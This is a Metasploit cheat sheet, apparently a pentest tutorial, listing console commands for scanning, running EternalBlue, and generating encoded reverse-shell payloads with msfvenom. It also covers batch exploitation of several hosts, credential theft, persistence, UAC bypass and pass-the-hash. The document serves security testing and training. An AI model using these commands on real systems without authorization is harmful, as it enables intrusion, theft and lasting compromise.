# Metasploit Framework - Penetration Testing Platform

## Overview
Metasploit is a comprehensive penetration testing platform featuring:
- Exploit development framework
- Vulnerability exploitation
- Post-exploitation modules
- Payload generation
- Network reconnaissance
- Automation capabilities

## Basic Usage

### Start Metasploit
```bash
# Start the console
msfconsole

# Start with specific database
msfconsole -y

# Start without banner
msfconsole -q

# Start with resource script
msfconsole -r script.rc
```

### Console Navigation
```bash
# Show help
help

# Show all commands
?

# Exit console
exit

# Clear screen
clear

# Show command history
history
```

## Module System

### Module Types
```bash
# Exploits
show exploits

# Payloads
show payloads

# Auxiliary modules
show auxiliary

# Post-exploitation modules
show post

# Encoders
show encoders

# Nops
show nops
```

### Searching Modules
```bash
# Search by name
search apache

# Search by type
search type:exploit

# Search by platform
search platform:windows

# Search by author
search author:rapid7

# Advanced search
search apache type:exploit platform:windows
```

## Information Gathering

### Port Scanning
```bash
# Use Nmap through Metasploit
use auxiliary/scanner/portscan/tcp

# Set options
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 50

# Run module
run
```

### Service Scanning
```bash
# SMB version scanning
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.100
run

# HTTP service detection
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.100
set RPORT 80
run
```

### Discovery Scans
```bash
# ARP sweep
use auxiliary/scanner/discovery/arp_sweep
set INTERFACE eth0
set RHOSTS 192.168.1.0/24
run

# SMB share enumeration
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run
```

## Exploitation

### Basic Exploit Usage
```bash
# Select exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 192.168.1.100

# Set payload
set payload windows/x64/meterpreter/reverse_tcp

# Set LHOST (your IP)
set LHOST 192.168.1.50

# Run exploit
exploit
```

### Target Configuration
```bash
# Show available targets
show targets

# Set specific target
set TARGET 2

# Show advanced options
show advanced

# Set advanced options
set EvasionLevel 1
```

### Payload Configuration
```bash
# Show compatible payloads
show payloads

# Set payload
set payload windows/meterpreter/reverse_tcp

# Set payload options
set LHOST 192.168.1.50
set LPORT 4444

# Generate payload
generate -f exe -o payload.exe
```

## Meterpreter

### Basic Meterpreter Commands
```bash
# System information
sysinfo

# Network interfaces
ipconfig

# Process list
ps

# User information
getuid

# Whoami
whoami
```

### File System Operations
```bash
# List files
ls

# Change directory
cd /path/to/directory

# Download file
download file.txt

# Upload file
upload local.txt remote.txt

# Edit file
edit file.txt
```

### Network Operations
```bash
# Port forward
portfwd add -l 3389 -p 3389 -r 192.168.1.100

# Route traffic
route add 192.168.2.0/24 1

# Network scan
run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
```

### Privilege Escalation
```bash
# Local exploit suggester
run post/multi/recon/local_exploit_suggester

# Bypass UAC
run post/windows/escalate/bypassuac

# Service permission abuse
run post/windows/gather/enum_services
```

## Payload Generation

### Generate Payloads
```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe > payload.exe

# Linux executable
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf > payload.elf

# Python payload
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.50 LPORT=4444 -f raw > payload.py
```

### Encoded Payloads
```bash
# Encoded Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe

# Encoded PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 -f psh-reflection > payload.ps1
```

## Post-Exploitation

### Information Gathering
```bash
# System information gathering
run post/windows/gather/checkvm

# Network information
run post/multi/gather/network_config

# Installed software
run post/windows/gather/enum_applications

# Browser credentials
run post/multi/gather/firefox_creds
```

### Persistence
```bash
# Windows persistence
run post/windows/manage/persistence_exe

# Linux persistence
run post/linux/manage/persistence_service

# Registry persistence
run post/windows/manage/registry_persistence
```

### Lateral Movement
```bash
# Pass the hash
use exploit/windows/smb/psexec
set SMBUser Administrator
set SMBPass hash_here
set RHOSTS 192.168.1.101
run

# SMB relay
use exploit/windows/smb/smb_relay
set SMBHOST 192.168.1.101
run
```

## Database Operations

### Database Commands
```bash
# Connect to database
db_connect postgresql@msf_database

# Add hosts
db_add_host 192.168.1.100

# Add services
db_add_service 192.168.1.100 tcp 80

# Import Nmap scan
db_nmap -sS -A 192.168.1.0/24

# Search database
db_hosts
db_services
db_vulns
```

### Workspace Management
```bash
# Create workspace
workspace -a pentest_project

# List workspaces
workspace -l

# Switch workspace
workspace pentest_project

# Delete workspace
workspace -d old_project
```

## Automation and Scripting

### Resource Scripts
```bash
# Create resource script
cat > automate.rc << EOF
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 21,22,23,80,443
run
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
EOF

# Execute resource script
msfconsole -r automate.rc
```

### Batch Operations
```bash
# Batch exploit multiple hosts
hosts=$(echo "192.168.1.100 192.168.1.101 192.168.1.102")
for host in $hosts; do
    echo "use exploit/windows/smb/ms17_010_eternalblue" >> batch.rc
    echo "set RHOSTS $host" >> batch.rc
    echo "set payload windows/x64/meterpreter/reverse_tcp" >> batch.rc
    echo "set LHOST 192.168.1.50" >> batch.rc
    echo "run -j" >> batch.rc
done
```

## Modules Categories

### Scanner Modules
```bash
# Port scanners
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/portscan/syn

# Service scanners
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/http/http_version
use auxiliary/scanner/ftp/anonymous

# Vulnerability scanners
use auxiliary/scanner/http/cve_2021_44228_log4j
use auxiliary/scanner/http/title
```

### Exploit Modules
```bash
# Windows exploits
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/http/tomcat_mgr_upload

# Linux exploits
use exploit/linux/http/samba_trans2open
use exploit/linux/http/awstats_configdir_exec

# Web application exploits
use exploit/multi/http/wp_cropshell
use exploit/multi/http/php_cgi_arg_injection
```

## Tips
- Keep Metasploit updated regularly
- Use workspaces to organize projects
- Document your testing procedures
- Use resource scripts for automation
- Test exploits in lab environments first
- Monitor target system stability during exploitation
- Use appropriate payloads for different scenarios
- Consider legal and ethical implications
- Backup important data before exploitation
- Combine with other tools for comprehensive assessment